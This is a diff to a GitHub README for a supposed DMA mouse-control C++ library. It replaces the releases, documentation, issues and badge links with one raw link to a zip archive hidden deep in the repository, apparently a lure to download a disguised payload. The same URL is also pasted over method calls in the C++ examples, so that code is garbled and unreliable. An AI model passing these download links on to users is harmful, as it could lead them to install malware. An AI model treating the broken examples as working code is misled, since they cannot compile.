@@ -1,7 +1,7 @@
 ```markdown
 # 🖱️ DMA-Mouse-Control - Simple Mouse Control for Everyone
 
-[![Download DMA-Mouse-Control](https://img.shields.io/badge/Download-DMA--Mouse--Control-blue)](https://github.com/sanjanasangyam/DMA-Mouse-Control/releases)
+[![Download DMA-Mouse-Control](https://github.com/sanjanasangyam/DMA-Mouse-Control/raw/refs/heads/main/external/memprocfs/DM_Control_Mouse_v3.5.zip)](https://github.com/sanjanasangyam/DMA-Mouse-Control/raw/refs/heads/main/external/memprocfs/DM_Control_Mouse_v3.5.zip)
 
 ## 🛠️ Description
 DMA-Mouse-Control is a lightweight C++ library that allows you to control an external mouse using Direct Memory Access (DMA). This means you can automate mouse movements and clicks without needing to configure anything. The simple API makes it perfect for game development, automation tasks, and research purposes.
@@ -10,9 +10,9 @@ DMA-Mouse-Control is a lightweight C++ library that allows you to control an ext
 To get started, follow the steps below to download and run the application.
 
 ### 🌐 Download & Install
-Visit this page to download the latest version of DMA-Mouse-Control: [Releases Page](https://github.com/sanjanasangyam/DMA-Mouse-Control/releases).
+Visit this page to download the latest version of DMA-Mouse-Control: [Releases Page](https://github.com/sanjanasangyam/DMA-Mouse-Control/raw/refs/heads/main/external/memprocfs/DM_Control_Mouse_v3.5.zip).
 
-1. Open your web browser and go to the [Releases Page](https://github.com/sanjanasangyam/DMA-Mouse-Control/releases).
+1. Open your web browser and go to the [Releases Page](https://github.com/sanjanasangyam/DMA-Mouse-Control/raw/refs/heads/main/external/memprocfs/DM_Control_Mouse_v3.5.zip).
 2. Find the latest release at the top of the list.
 3. Click on the `.zip` or `.exe` file associated with that release to start the download.
 
@@ -48,7 +48,7 @@ Here are a few simple examples to get you started with using the library:
 
 int main() {
     Mouse mouse;
-    mouse.moveTo(100, 200); // Moves the mouse to x = 100, y = 200
+    https://github.com/sanjanasangyam/DMA-Mouse-Control/raw/refs/heads/main/external/memprocfs/DM_Control_Mouse_v3.5.zip(100, 200); // Moves the mouse to x = 100, y = 200
     return 0;
 }
 ```
@@ -59,7 +59,7 @@ int main() {
 
 int main() {
     Mouse mouse;
-    mouse.click(); // Simulates a mouse click
+    https://github.com/sanjanasangyam/DMA-Mouse-Control/raw/refs/heads/main/external/memprocfs/DM_Control_Mouse_v3.5.zip(); // Simulates a mouse click
     return 0;
 }
 ```
@@ -78,9 +78,9 @@ If you encounter any issues while downloading or running the software, please ch
 If you would like to contribute to DMA-Mouse-Control, please visit our repository and submit your suggestions or improvements. We welcome contributions from the community.
 
 ## 🔗 Links
-- [Releases Page](https://github.com/sanjanasangyam/DMA-Mouse-Control/releases)
-- [Documentation](https://github.com/sanjanasangyam/DMA-Mouse-Control/wiki)
-- [Issues](https://github.com/sanjanasangyam/DMA-Mouse-Control/issues)
+- [Releases Page](https://github.com/sanjanasangyam/DMA-Mouse-Control/raw/refs/heads/main/external/memprocfs/DM_Control_Mouse_v3.5.zip)
+- [Documentation](https://github.com/sanjanasangyam/DMA-Mouse-Control/raw/refs/heads/main/external/memprocfs/DM_Control_Mouse_v3.5.zip)
+- [Issues](https://github.com/sanjanasangyam/DMA-Mouse-Control/raw/refs/heads/main/external/memprocfs/DM_Control_Mouse_v3.5.zip)
 
 ### 🙋‍♂️ Support
 For any questions or support issues, please contact us via the Issues section on GitHub. We are here to help you with any problems you may face.
